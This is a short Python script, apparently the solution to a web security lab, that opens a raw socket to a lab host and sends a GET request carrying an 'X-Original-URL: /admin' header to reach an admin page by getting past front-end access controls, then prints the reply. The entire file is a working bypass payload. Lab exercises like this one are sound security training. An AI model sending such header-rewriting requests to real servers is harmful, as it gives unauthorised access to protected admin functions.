import socket

HOST = 'lap3-front_end_request_rewriting.labs-is-here.online' 
# HOST = '0.0.0.0'
# PORT = 8000
PORT = 9000        # Порт (если Flask dev-сервер, то 5000)


payload = (
    "GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "X-Original-URL: /admin\r\n"
    "\r\n"
)

#
with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())

